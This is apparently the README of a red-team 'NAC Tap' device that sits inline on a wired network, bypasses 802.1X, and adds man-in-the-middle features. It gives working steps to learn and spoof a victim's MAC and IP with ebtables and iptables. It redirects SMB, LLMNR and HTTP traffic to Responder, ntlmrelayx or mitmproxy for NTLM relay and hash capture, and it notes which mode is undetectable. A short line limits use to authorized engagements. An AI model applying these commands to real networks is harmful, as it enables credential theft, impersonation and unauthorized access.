# NAC Tap - MITM Features

## Overview

The NAC Tap now includes **active MITM capabilities** in addition to passive monitoring. This allows you to intercept and relay specific protocols to attack tools (Responder, ntlmrelayx, etc.).

## How It Works

### 1. Victim Learning
- Bridge passively captures 20 packets over 30 seconds
- Identifies victim MAC address (most common source)
- Identifies victim IP address
- Identifies gateway MAC address
- All automatic - no manual configuration needed

### 2. Identity Spoofing
- **MAC Spoofing**: Uses `ebtables` to rewrite attacker MACs to victim MAC
- **IP Spoofing**: Uses `iptables SNAT` to rewrite attacker IPs to victim IP
- All traffic from your attack tools appears to come from the victim

### 3. Protocol Interception
- **DNAT rules** redirect specific ports to bridge IP (10.200.66.1) or remote VM
- Supports TCP and UDP
- Pre-configured protocol groups:
  - **SMB/NetBIOS**: 137, 138, 139, 445
  - **Name Resolution**: LLMNR (5355), mDNS (5353)
  - **HTTP**: 80

### 4. Local vs Remote Mode

#### Local Mode (Default)
- Traffic redirected to bridge IP: **10.200.66.1**
- Run Responder/ntlmrelayx directly on the NAC tap device
- Best for simple attacks

#### Remote Mode
- Traffic forwarded to external VM over WiFi (e.g., 172.31.250.100)
- Run attack tools on your laptop/Kali VM
- NAC tap device acts as relay
- Requires Wi-Fi AP configured

## Usage Workflow

### Basic Attack (Local Mode)

```bash
# 1. Start NAC Tap
sudo python3 nac-tap.py

# 2. In web UI (http://172.31.250.1:8080):
#    - Status tab: Start Capture
#    - MITM tab: Enable MITM (waits 30s to learn victim)
#    - MITM tab: Click "SMB/NetBIOS" to intercept

# 3. On NAC tap device, run attack tool:
sudo responder -I br0 -wrf

# 4. Victim's SMB/LLMNR traffic now hits your Responder
#    Victim's machine thinks responses come from itself (spoofed)
```

### Advanced Attack (Remote Mode)

```bash
# 1. Setup NAC tap with Wi-Fi AP
sudo bash setup-wifi-ap.sh

# 2. Start NAC Tap
sudo python3 nac-tap.py

# 3. On your laptop, connect to NAC tap Wi-Fi
#    IP: 172.31.250.100 (or any IP in 172.31.250.50-150 range)

# 4. In web UI:
#    - MITM tab: Enter remote IP: 172.31.250.100
#    - MITM tab: Enable MITM
#    - MITM tab: Click protocol cards to intercept

# 5. On your laptop (172.31.250.100), run attack tools:
sudo responder -I <interface> -wrf
# Or
ntlmrelayx.py -t smb://target-server -smb2support

# 6. NAC tap device relays intercepted traffic to you
#    All spoofing happens automatically
```

## Attack Scenarios

### Scenario 1: NTLM Relay Attack
```bash
# Enable MITM, intercept SMB (445)
# Run on bridge IP or remote VM:
ntlmrelayx.py -t smb://10.x.x.x -smb2support

# Victim SMB authentication attempts relay to target
# Spoofed as coming from victim itself
```

### Scenario 2: LLMNR/NetBIOS Poisoning
```bash
# Enable MITM, intercept Name Resolution + SMB
# Run Responder:
sudo responder -I br0 -wrf

# Victim name resolution requests intercepted
# Responds with bridge IP, victim connects, hashes captured
```

### Scenario 3: HTTP Interception
```bash
# Enable MITM, intercept HTTP (80)
# Run HTTP proxy on bridge IP:
mitmproxy --mode transparent --listen-port 80

# Victim HTTP traffic routed through your proxy
# Can inject, modify, or capture credentials
```

## Technical Details

### NAT Rules Created

**MAC Spoofing (ebtables)**:
```bash
ebtables -t nat -A POSTROUTING -o eth1 -j snat --to-src <victim-mac>
```

**IP Spoofing (iptables)**:
```bash
iptables -t nat -A POSTROUTING -o br0 -j SNAT --to-source <victim-ip>
```

**Traffic Redirection (iptables)**:
```bash
iptables -t nat -A PREROUTING -i br0 -p tcp --dport 445 -j DNAT --to 10.200.66.1:445
```

**Remote Routing (if remote mode)**:
```bash
iptables -A FORWARD -i br0 -o wlan0 -j ACCEPT
iptables -A FORWARD -i wlan0 -o br0 -j ACCEPT
iptables -t nat -A POSTROUTING -o wlan0 -d <remote-vm> -j SNAT --to-source 172.31.250.1
```

## Cleanup

All rules automatically cleaned up when:
- Clicking "Disable MITM"
- Stopping the script (Ctrl+C)
- Script crashes (signal handler)

No persistent iptables rules - clean slate on restart.

## Security Considerations

### Detection Risk
- **Passive mode** (no MITM): Undetectable - pure L2 bridge
- **MITM mode**: Detectable by network monitoring tools
  - Bridge gets IP address (10.200.66.1)
  - NAT rules modify traffic
  - Timing analysis may reveal interception

### When to Use MITM
- ✅ Red team engagements (authorized)
- ✅ Security research in lab environments
- ✅ Testing network monitoring capabilities
- ❌ **NOT for unauthorized access**

### Best Practices
1. Use passive mode by default
2. Enable MITM only when actively attacking
3. Disable MITM immediately after capture
4. Monitor logs for unexpected behavior
5. Clean up rules before disconnecting

## Troubleshooting

### MITM Enable Fails
- **Check**: Capture must be started first
- **Check**: Ensure victim is sending traffic (wait 30s)
- **Fix**: Try again, victim may be idle

### Intercept Rules Not Working
- **Check**: MITM must be enabled first
- **Check**: Victim IP/MAC learned correctly (check MITM tab)
- **Check**: iptables/ebtables installed: `which iptables ebtables`

### Remote Mode Not Working
- **Check**: Remote VM can ping bridge: `ping 10.200.66.1`
- **Check**: WiFi AP running: `systemctl status hostapd`
- **Check**: Firewall on remote VM not blocking traffic

### Responder Not Receiving Traffic
- **Check**: Responder listening on correct interface: `-I br0`
- **Check**: Bridge IP assigned: `ip addr show br0`
- **Check**: Intercept rules active (view in MITM tab)

## Advanced Configuration

### Add Custom Protocol
Edit `nac-tap.py`:
```python
INTERCEPT_PROTOCOLS = {
    'smb': [...],
    'my_protocol': [
        ('My-Service', 9999, ['tcp', 'udp']),
    ],
}
```

### Change Bridge IP
Edit `CONFIG['BRIDGE_IP']` in `nac-tap.py`:
```python
'BRIDGE_IP': '192.168.100.1',  # Your preferred IP
```

### Modify Learning Timeout
In MITM tab API call, default is 30 seconds. Increase for slow networks.

## Dependencies

MITM mode requires:
- `iptables` - IP-level NAT/DNAT
- `ebtables` - MAC-level spoofing
- All included in `install-dependencies.sh`

## Logging

All MITM operations logged to:
- `/var/log/auto-nac-bridge.log`

Check logs:
```bash
sudo tail -f /var/log/auto-nac-bridge.log
```

## Performance Impact

- **Passive mode**: Zero latency impact
- **MITM mode**: <1ms latency (NAT processing)
- **With interception**: <5ms (depends on attack tool response time)

Bridge remains fully transparent to 802.1X authentication at all times.

